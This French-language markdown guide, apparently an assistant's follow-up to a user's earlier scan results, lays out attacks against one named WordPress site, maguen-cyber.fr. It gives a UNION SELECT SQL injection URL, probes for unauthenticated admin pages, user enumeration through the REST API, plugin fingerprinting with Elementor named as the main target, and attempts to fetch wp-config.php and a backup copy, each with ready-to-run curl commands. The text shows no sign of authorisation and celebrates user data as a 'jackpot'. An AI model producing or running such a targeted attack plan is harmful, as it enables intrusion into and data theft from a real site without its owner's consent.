# 🔥 TESTS MANUELS COMPLÉMENTAIRES

## Basé sur tes résultats, voici les tests précis à faire :

### 1. 💉 SQL INJECTION - TEST MANUEL PRÉCIS
**URL exacte à tester dans ton navigateur :**
```
https://maguen-cyber.fr/?p=1' UNION SELECT 'VULNERABLE',2,3--
```

**Alternative (encode les espaces) :**
```
https://maguen-cyber.fr/?p=1%27%20UNION%20SELECT%20%27VULNERABLE%27,2,3--
```

**Ce que tu dois voir :**
- Page qui change de contenu
- Ou erreur SQL visible  
- Ou le mot "VULNERABLE" qui apparaît quelque part

### 2. 🚪 ADMIN PANEL - EXPLORATION
Tu as vu la page de login, maintenant teste :

**Pages admin spécifiques :**
```
https://maguen-cyber.fr/wp-admin/edit.php
https://maguen-cyber.fr/wp-admin/users.php  
https://maguen-cyber.fr/wp-admin/themes.php
https://maguen-cyber.fr/wp-admin/plugins.php
```

**Ce qui peut arriver :**
- Redirection vers login (normal)
- **OU accès direct** (vulnérabilité critique !)

### 3. 📊 API REST - EXTRACTION MAXIMALE  
Tu as confirmé que l'API marche ! Maintenant extrais plus :

**Users (le plus important) :**
```
https://maguen-cyber.fr/?rest_route=/wp/v2/users
https://maguen-cyber.fr/wp-json/wp/v2/users
```

**Pages complètes :**
```
https://maguen-cyber.fr/?rest_route=/wp/v2/pages&per_page=100
```

**Médias :**
```
https://maguen-cyber.fr/?rest_route=/wp/v2/media&per_page=100
```

### 4. 🧩 PLUGINS - TESTS PRÉCIS
**Elementor (notre cible principale) :**
```
https://maguen-cyber.fr/?action=elementor_ajax
https://maguen-cyber.fr/wp-content/plugins/elementor/readme.txt
```

**Contact Form 7 :**
```
https://maguen-cyber.fr/?wpcf7=true
https://maguen-cyber.fr/wp-content/plugins/contact-form-7/readme.txt  
```

**Répertoire plugins :**
```
https://maguen-cyber.fr/wp-content/plugins/
```

### 5. 🔍 RECHERCHE D'INFOS SENSIBLES
**wp-config.php (configuration critique) :**
```
https://maguen-cyber.fr/wp-config.php
https://maguen-cyber.fr/wp-config.php.bak
```

**Readme WordPress :**
```
https://maguen-cyber.fr/readme.html
```

## 🎯 COMMANDES CURL PRÉCISES

Si tu préfères la ligne de commande :

```bash
# SQL Injection test
curl -s "https://maguen-cyber.fr/?p=1%27%20UNION%20SELECT%20%27VULNERABLE%27,2,3--" | grep -i vulnerable

# Users extraction  
curl -s "https://maguen-cyber.fr/?rest_route=/wp/v2/users" | jq .

# Plugin versions
curl -s "https://maguen-cyber.fr/wp-content/plugins/elementor/readme.txt" | head -20

# Admin pages
curl -I "https://maguen-cyber.fr/wp-admin/edit.php"
curl -I "https://maguen-cyber.fr/wp-admin/users.php"
```

## 📋 CE QU'ON CHERCHE

1. **SQL Injection** : Contenu de page modifié ou erreurs SQL
2. **Admin Access** : Pages qui ne redirigent PAS vers login  
3. **API Users** : Informations sur les utilisateurs WordPress
4. **Plugin Versions** : Numéros de version exposés
5. **Config Files** : Fichiers de configuration accessibles

## 🚨 PRIORITÉ ABSOLUE

**Teste d'abord ça :**
```
https://maguen-cyber.fr/?rest_route=/wp/v2/users
```

**Si tu vois des infos utilisateurs → JACKPOT TOTAL !**